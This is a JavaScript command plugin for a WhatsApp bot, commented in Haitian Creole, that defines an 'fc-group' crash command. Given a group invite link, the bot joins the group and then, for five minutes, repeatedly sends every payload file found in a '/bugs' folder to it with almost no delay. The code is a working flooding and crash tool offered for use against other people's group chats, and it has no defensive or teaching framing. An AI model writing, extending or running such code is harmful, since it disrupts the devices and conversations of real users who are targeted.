const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');
const { getInviteInfo } = require('@whiskeysockets/baileys'); // Asire modil sa disponib

cmd({
  pattern: 'fc-group',
  desc: '💣 Flood/crash yon gwoup pandan 5 minit',
  category: 'bug',
  react: '🧨',
  filename: __filename
}, async (bot, mek, m, { from, reply, args }) => {
  try {
    const groupLink = args[0];

    if (!groupLink || !groupLink.includes('chat.whatsapp.com/')) {
      return await reply(`❌ Usage:\n${config.PREFIX}fc-group <group link>`);
    }

    const inviteCode = groupLink.split('https://chat.whatsapp.com/')[1]?.trim();
    if (!inviteCode) return await reply('❌ Link pa valid.');

    let groupInfo;
    try {
      groupInfo = await bot.groupAcceptInvite(inviteCode);
    } catch (err) {
      return await reply('🚫 Erè: Bot pa kapab antre nan gwoup la. Petèt li limite oswa deja ladan.');
    }

    const groupMetadata = await bot.groupMetadata(groupInfo);
    const groupId = groupMetadata.id;
    const groupName = groupMetadata.subject;

    const bugFolder = path.join(__dirname, '../bugs');
    const payloads = fs.readdirSync(bugFolder).filter(f => f.endsWith('.js'));

    if (!payloads.length) return await reply('📂 Pa gen payload nan folder `/bugs`.');

    // Avètisman
    const imagePath = path.join(__dirname, '../media/5.png');
    const buffer = fs.readFileSync(imagePath);
    await bot.sendMessage(from, {
      image: buffer,
      caption: `🔥 *fc-group launched!*\n👥 Gwoup: ${groupName}\n⏱️ Duration: 5 minit\n📦 Payloads: ${payloads.length}\n🚀 Mode: Group only`,
    }, { quoted: mek });

    const end = Date.now() + 5 * 60 * 1000;

    while (Date.now() < end) {
      for (const file of payloads) {
        try {
          const payloadPath = path.join(bugFolder, file);
          let attack = require(payloadPath);

          if (typeof attack === 'string') {
            const msg = attack;
            attack = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof attack === 'object' && typeof attack.default === 'string') {
            const msg = attack.default;
            attack = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof attack === 'function') {
            await attack(bot, groupId);
          }

        } catch (err) {
          console.error(`❌ Error nan ${file}:`, err.message);
        }

        await new Promise(res => setTimeout(res, 0.4)); // delay 0.4ms
      }
    }

    await reply(`✅ *fc-group* fini sou gwoup: ${groupName}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});